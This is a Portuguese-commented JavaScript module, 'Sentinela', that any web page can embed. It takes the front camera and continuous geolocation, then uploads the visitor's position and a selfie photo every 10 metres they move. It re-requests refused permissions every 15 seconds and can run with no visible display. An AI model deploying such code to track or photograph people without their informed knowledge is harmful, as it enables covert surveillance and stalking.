/*
 * SENTINELA — CAPTURE ENGINE UNIVERSAL
 *
 * Backend esperado:
 *   GET  /api/session?page_key=<PAGE_KEY>
 *   POST /location
 *   POST /upload
 *
 * Uso:
 *
 *   <script
 *       src="/static/js/capture.js"
 *       data-page-key="1">
 *   </script>
 *
 * A página HTML precisa apenas possuir, se quiser utilizar
 * os elementos visuais:
 *
 *   #camera
 *   #canvas
 *   #latitude
 *   #longitude
 *   #photoCount
 *   #distance
 *   #status
 *   #session
 *   #startCapture
 *
 * O sistema:
 *
 *   1. Identifica a sessão
 *   2. Solicita câmera
 *   3. Solicita localização
 *   4. Usa watchPosition()
 *   5. Calcula deslocamento
 *   6. Ao atingir 10 metros:
 *        - registra localização
 *        - tira fotografia
 *        - envia fotografia
 *
 * As permissões de câmera e localização dependem
 * da autorização explícita do visitante.
 */

(function () {

    "use strict";


    // =====================================================
    // CONFIGURAÇÃO
    // =====================================================

    const script = document.currentScript;


    /*
     * O page_key pode ser informado de três formas:
     *
     * 1. data-page-key="1"
     *
     * 2. <html data-page-key="1">
     *
     * 3. ?page_key=1
     */

    const pageKey =
        (script && script.dataset.pageKey) ||
        document.documentElement.dataset.pageKey ||
        new URLSearchParams(
            window.location.search
        ).get("page_key");


    if (!pageKey) {

        console.error(
            "capture.js: page_key não informado."
        );

        return;
    }


    /*
     * Distância necessária para gerar
     * uma nova captura.
     */

    const MIN_DISTANCE_METERS = 10;


    /*
     * Tempo entre tentativas de verificar
     * novamente as permissões.
     */

    const PERMISSION_RECHECK_MS = 15000;


    // =====================================================
    // ELEMENTOS HTML
    // =====================================================

    const video =
        document.getElementById("camera");


    const canvas =
        document.getElementById("canvas");


    const latitudeElement =
        document.getElementById("latitude");


    const longitudeElement =
        document.getElementById("longitude");


    const photoCountElement =
        document.getElementById("photoCount");


    const distanceElement =
        document.getElementById("distance");


    const statusElement =
        document.getElementById("status");


    const sessionElement =
        document.getElementById("session");


    const startButton =
        document.getElementById("startCapture");


    // =====================================================
    // ESTADO
    // =====================================================

    let stream = null;

    let captureId = null;

    let deviceId = null;

    let lastLocationId = null;

    let lastPhotoLatitude = null;

    let lastPhotoLongitude = null;

    let photoCount = 0;

    let takingPhoto = false;

    let watchId = null;

    let isCameraActive = false;

    let isGeoActive = false;

    let recheckInterval = null;

    let started = false;


    // =====================================================
    // STATUS
    // =====================================================

    function setStatus(
        text,
        isError = false
    ) {

        if (!statusElement) {
            return;
        }


        statusElement.textContent = text;


        statusElement.classList.toggle(
            "error",
            isError
        );


        statusElement.classList.toggle(
            "ok",
            !isError
        );
    }


    // =====================================================
    // MOSTRAR COORDENADAS
    // =====================================================

    function updatePositionDisplay(
        latitude,
        longitude
    ) {

        if (latitudeElement) {

            latitudeElement.textContent =
                Number(latitude).toFixed(6);
        }


        if (longitudeElement) {

            longitudeElement.textContent =
                Number(longitude).toFixed(6);
        }
    }


    // =====================================================
    // CÁLCULO DE DISTÂNCIA
    // =====================================================

    function calculateDistance(
        lat1,
        lon1,
        lat2,
        lon2
    ) {

        const R = 6371000;

        const rad =
            Math.PI / 180;


        const dLat =
            (lat2 - lat1) * rad;


        const dLon =
            (lon2 - lon1) * rad;


        const a =

            Math.sin(dLat / 2) ** 2 +

            Math.cos(lat1 * rad) *

            Math.cos(lat2 * rad) *

            Math.sin(dLon / 2) ** 2;


        return R *
            (
                2 *
                Math.atan2(
                    Math.sqrt(a),
                    Math.sqrt(1 - a)
                )
            );
    }


    // =====================================================
    // IDENTIFICAÇÃO DA SESSÃO
    // =====================================================

    async function getPersistentSession() {

        if (captureId) {

            return captureId;
        }


        setStatus(
            "Identificando este dispositivo..."
        );


        const response = await fetch(

            "/api/session?page_key=" +

            encodeURIComponent(pageKey),

            {

                method: "GET",

                credentials: "same-origin",

                cache: "no-store"
            }
        );


        if (!response.ok) {

            throw new Error(
                "Erro ao consultar a sessão do dispositivo."
            );
        }


        const data =
            await response.json();


        if (!data.success) {

            throw new Error(

                data.error ||

                "O servidor não conseguiu identificar o dispositivo."
            );
        }


        if (!data.capture_id) {

            throw new Error(
                "O servidor não retornou um capture_id."
            );
        }


        captureId =
            data.capture_id;


        deviceId =
            data.device_id || null;


        if (sessionElement) {

            sessionElement.textContent =
                captureId.substring(0, 8);
        }


        return data;
    }


    // =====================================================
    // CÂMERA
    // =====================================================

    async function requestCameraPermission() {

        if (isCameraActive) {

            return true;
        }


        if (!video || !canvas) {

            console.warn(

                "capture.js: #camera e/ou #canvas " +
                "não encontrados."

            );

            return false;
        }


        if (

            !navigator.mediaDevices ||

            !navigator.mediaDevices.getUserMedia

        ) {

            setStatus(

                "Este navegador não oferece acesso à câmera.",

                true
            );

            return false;
        }


        try {

            stream =
                await navigator.mediaDevices.getUserMedia({

                    video: {

                        facingMode: "user"
                    },

                    audio: false
                });


            video.srcObject =
                stream;


            await video
                .play()
                .catch(function () {});


            isCameraActive =
                true;


            /*
             * Caso já exista uma localização
             * aguardando fotografia.
             */

            if (lastLocationId !== null) {

                captureAndUploadPhoto(
                    lastLocationId
                ).catch(console.error);
            }


            return true;


        } catch (err) {

            console.warn(
                "Câmera não permitida:",
                err.message
            );


            return false;
        }
    }


    // =====================================================
    // LOCALIZAÇÃO ATUAL
    // =====================================================

    function getCurrentLocation() {

        return new Promise(
            function (
                resolve,
                reject
            ) {

                if (!navigator.geolocation) {

                    reject(

                        new Error(
                            "Geolocalização não suportada."
                        )
                    );

                    return;
                }


                navigator.geolocation.getCurrentPosition(

                    resolve,

                    reject,

                    {

                        enableHighAccuracy: true,

                        timeout: 20000,

                        maximumAge: 0
                    }
                );
            }
        );
    }


    // =====================================================
    // ENVIO DA LOCALIZAÇÃO
    // =====================================================

    async function uploadLocation(

        latitude,

        longitude,

        accuracy

    ) {

        if (!captureId) {

            throw new Error(
                "A sessão ainda não foi identificada."
            );
        }


        const response =
            await fetch(

                "/location",

                {

                    method: "POST",

                    credentials: "same-origin",

                    headers: {

                        "Content-Type":
                            "application/json"
                    },

                    body: JSON.stringify({

                        capture_id:
                            captureId,

                        page_key:
                            pageKey,

                        latitude:
                            latitude,

                        longitude:
                            longitude,

                        accuracy:
                            accuracy
                    })
                }
            );


        if (!response.ok) {

            throw new Error(

                "Erro HTTP ao enviar localização: " +

                response.status
            );
        }


        const data =
            await response.json();


        if (!data.success) {

            throw new Error(

                data.error ||

                "Erro ao registrar localização."
            );
        }


        return data;
    }


    // =====================================================
    // SOLICITA LOCALIZAÇÃO
    // =====================================================

    async function requestGeoPermission() {

        if (isGeoActive) {

            return true;
        }


        try {

            const position =
                await getCurrentLocation();


            const latitude =
                position.coords.latitude;


            const longitude =
                position.coords.longitude;


            const accuracy =
                position.coords.accuracy;


            updatePositionDisplay(

                latitude,

                longitude
            );


            const locationResult =
                await uploadLocation(

                    latitude,

                    longitude,

                    accuracy
                );


            lastLocationId =
                locationResult.location_id;


            lastPhotoLatitude =
                latitude;


            lastPhotoLongitude =
                longitude;


            if (distanceElement) {

                distanceElement.textContent =
                    "0 m";
            }


            /*
             * Começa o monitoramento contínuo.
             */

            startWatchingPosition();


            isGeoActive =
                true;


            /*
             * Se a câmera já estiver ativa,
             * faz a primeira fotografia.
             */

            if (isCameraActive) {

                await captureAndUploadPhoto(
                    lastLocationId
                );
            }


            return true;


        } catch (err) {

            console.warn(

                "Geolocalização não permitida:",

                err.message
            );


            return false;
        }
    }


    // =====================================================
    // WATCH POSITION
    // =====================================================

    function startWatchingPosition() {

        if (!navigator.geolocation) {

            return;
        }


        if (watchId !== null) {

            navigator.geolocation.clearWatch(
                watchId
            );
        }


        watchId =
            navigator.geolocation.watchPosition(

                handlePosition,

                handleLocationError,

                {

                    enableHighAccuracy: true,

                    maximumAge: 0,

                    timeout: 20000
                }
            );
    }


    // =====================================================
    // NOVA POSIÇÃO
    // =====================================================

    async function handlePosition(
        position
    ) {

        const latitude =
            position.coords.latitude;


        const longitude =
            position.coords.longitude;


        const accuracy =
            position.coords.accuracy;


        updatePositionDisplay(

            latitude,

            longitude
        );


        /*
         * Se ainda não temos uma posição
         * de referência.
         */

        if (

            lastPhotoLatitude === null ||

            lastPhotoLongitude === null

        ) {

            lastPhotoLatitude =
                latitude;


            lastPhotoLongitude =
                longitude;


            return;
        }


        /*
         * Calcula a distância desde
         * a última fotografia.
         */

        const distance =
            calculateDistance(

                lastPhotoLatitude,

                lastPhotoLongitude,

                latitude,

                longitude
            );


        if (distanceElement) {

            distanceElement.textContent =
                distance.toFixed(1) + " m";
        }


        /*
         * Ainda não atingiu os 10 metros.
         */

        if (

            distance <
                MIN_DISTANCE_METERS ||

            takingPhoto

        ) {

            return;
        }


        takingPhoto =
            true;


        try {

            /*
             * Primeiro registra a localização.
             */

            const locationResult =
                await uploadLocation(

                    latitude,

                    longitude,

                    accuracy
                );


            lastLocationId =
                locationResult.location_id;


            /*
             * Depois faz a fotografia.
             */

            if (isCameraActive) {

                await captureAndUploadPhoto(

                    lastLocationId
                );
            }


            /*
             * Essa passa a ser a nova
             * posição de referência.
             */

            lastPhotoLatitude =
                latitude;


            lastPhotoLongitude =
                longitude;


            if (distanceElement) {

                distanceElement.textContent =
                    "0 m";
            }


            setStatus(

                "Nova captura realizada aos " +

                MIN_DISTANCE_METERS +

                " metros."
            );


        } catch (error) {

            console.error(

                "Erro na nova captura:",

                error
            );


            setStatus(

                "Erro ao registrar captura: " +

                error.message,

                true
            );


        } finally {

            takingPhoto =
                false;
        }
    }


    // =====================================================
    // ERRO DE LOCALIZAÇÃO
    // =====================================================

    function handleLocationError(
        error
    ) {

        console.error(

            "Erro de geolocalização:",

            error
        );


        isGeoActive =
            false;


        setStatus(

            "Erro de localização: " +

            error.message,

            true
        );
    }


    // =====================================================
    // CAPTURA DA FOTO
    // =====================================================

    async function captureAndUploadPhoto(
        locationId
    ) {

        if (

            !captureId ||

            !isCameraActive ||

            !video ||

            !canvas

        ) {

            return;
        }


        if (

            !video.videoWidth ||

            !video.videoHeight

        ) {

            console.warn(
                "A câmera ainda não está pronta."
            );

            return;
        }


        /*
         * Define tamanho do canvas
         * conforme a câmera.
         */

        canvas.width =
            video.videoWidth;


        canvas.height =
            video.videoHeight;


        const context =
            canvas.getContext("2d");


        context.drawImage(

            video,

            0,

            0,

            canvas.width,

            canvas.height
        );


        /*
         * Converte o frame para JPEG.
         */

        const blob =
            await new Promise(

                function (resolve) {

                    canvas.toBlob(

                        resolve,

                        "image/jpeg",

                        0.90
                    );
                }
            );


        if (!blob) {

            throw new Error(
                "Não foi possível gerar a fotografia."
            );
        }


        /*
         * Monta o formulário.
         */

        const formData =
            new FormData();


        formData.append(

            "photo",

            blob,

            "capture.jpg"
        );


        formData.append(

            "capture_id",

            captureId
        );


        formData.append(

            "page_key",

            pageKey
        );


        if (

            locationId !== null &&

            locationId !== undefined

        ) {

            formData.append(

                "location_id",

                locationId
            );
        }


        /*
         * Envia para o Flask.
         */

        const response =
            await fetch(

                "/upload",

                {

                    method: "POST",

                    credentials:
                        "same-origin",

                    body:
                        formData
                }
            );


        if (!response.ok) {

            throw new Error(

                "Erro HTTP no upload: " +

                response.status
            );
        }


        const data =
            await response.json();


        if (!data.success) {

            throw new Error(

                data.error ||

                "Erro ao salvar fotografia."
            );
        }


        /*
         * Atualiza contador.
         */

        photoCount += 1;


        if (photoCountElement) {

            photoCountElement.textContent =
                String(photoCount);
        }


        return data;
    }


    // =====================================================
    // INICIALIZAÇÃO
    // =====================================================

    async function start() {

        if (started) {

            return;
        }


        started =
            true;


        try {

            /*
             * Identifica a página/sessão.
             */

            await getPersistentSession();


            setStatus(
                "Solicitando autorizações..."
            );


            /*
             * Solicita câmera.
             */

            const camOk =
                await requestCameraPermission();


            /*
             * Solicita localização.
             */

            const geoOk =
                await requestGeoPermission();


            /*
             * Pelo menos uma das duas
             * permissões foi concedida.
             */

            if (camOk || geoOk) {

                if (
                    camOk &&
                    geoOk
                ) {

                    setStatus(
                        "Câmera e localização ativas."
                    );


                } else if (camOk) {

                    setStatus(

                        "Apenas câmera ativa. " +
                        "Aguardando localização..."
                    );


                } else {

                    setStatus(

                        "Apenas localização ativa. " +
                        "Aguardando câmera..."
                    );
                }


                startPermissionRecheckLoop();


                return true;
            }


            setStatus(

                "É necessário aceitar ao menos uma " +
                "permissão para prosseguir.",

                true
            );


            startPermissionRecheckLoop();


            return false;


        } catch (error) {

            console.error(

                "Erro na inicialização:",

                error
            );


            setStatus(

                error.message ||

                "Não foi possível iniciar a captura.",

                true
            );


            started =
                false;


            return false;
        }
    }


    // =====================================================
    // VERIFICA NOVAMENTE AS PERMISSÕES
    // =====================================================

    function startPermissionRecheckLoop() {

        if (recheckInterval) {

            return;
        }


        recheckInterval =

            setInterval(

                async function () {

                    /*
                     * Se ambas estão ativas,
                     * não precisamos continuar verificando.
                     */

                    if (

                        isCameraActive &&

                        isGeoActive

                    ) {

                        clearInterval(
                            recheckInterval
                        );


                        recheckInterval =
                            null;


                        return;
                    }


                    /*
                     * Tenta câmera novamente.
                     */

                    if (!isCameraActive) {

                        await requestCameraPermission();
                    }


                    /*
                     * Tenta localização novamente.
                     */

                    if (!isGeoActive) {

                        await requestGeoPermission();
                    }
                },

                PERMISSION_RECHECK_MS
            );
    }


    // =====================================================
    // PARAR O SISTEMA
    // =====================================================

    function stop() {

        /*
         * Para watchPosition().
         */

        if (watchId !== null) {

            navigator.geolocation.clearWatch(
                watchId
            );


            watchId =
                null;
        }


        /*
         * Para verificação das permissões.
         */

        if (recheckInterval) {

            clearInterval(
                recheckInterval
            );


            recheckInterval =
                null;
        }


        /*
         * Desliga câmera.
         */

        if (stream) {

            stream
                .getTracks()
                .forEach(

                    function (track) {

                        track.stop();
                    }
                );


            stream =
                null;
        }


        isCameraActive =
            false;


        isGeoActive =
            false;


        started =
            false;
    }


    // =====================================================
    // API PÚBLICA
    // =====================================================

    /*
     * Disponibiliza funções para a própria
     * página HTML controlar o sistema.
     */

    window.SentinelaCapture = {

        start:
            start,

        stop:
            stop,

        getSession:
            getPersistentSession,

        getCaptureId:
            function () {

                return captureId;
            },

        getPageKey:
            function () {

                return pageKey;
            },

        isCameraActive:
            function () {

                return isCameraActive;
            },

        isGeoActive:
            function () {

                return isGeoActive;
            },

        capturePhoto:
            function () {

                return captureAndUploadPhoto(
                    lastLocationId
                );
            }
    };


    // =====================================================
    // BOTÃO AUTOMÁTICO
    // =====================================================

    if (startButton) {

        startButton.addEventListener(

            "click",

            function () {

                start();
            }
        );
    }

})();
